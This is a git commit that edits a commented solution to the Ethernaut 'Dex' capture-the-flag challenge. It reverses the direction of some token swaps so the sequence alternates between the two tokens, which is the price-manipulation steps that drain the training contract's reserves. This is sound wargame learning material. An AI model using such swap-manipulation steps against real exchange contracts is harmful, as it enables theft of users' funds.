fa619c229c2fce8bd24cd8908b241bc71726de88
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-08-01 17:50:33 +0200

    Update Solution.sol

--- Ethernaut Challenge 22-Dex/Solution.sol
+++ Ethernaut Challenge 22-Dex/Solution.sol
@@ -19,11 +19,11 @@ The actual code:
    t2 = await contract.token2()
 
 3. await contract.swap(t1, t2, 10)
-  await contract.swap(t1, t2, 20)
+  await contract.swap(t2, t1, 20)
   await contract.swap(t1, t2, 24)
-  await contract.swap(t1, t2, 30)
+  await contract.swap(t2, t1, 30)
   await contract.swap(t1, t2, 41)
-  await contract.swap(t1, t2, 45)
+  await contract.swap(t2, t1, 45)
 
 
 */
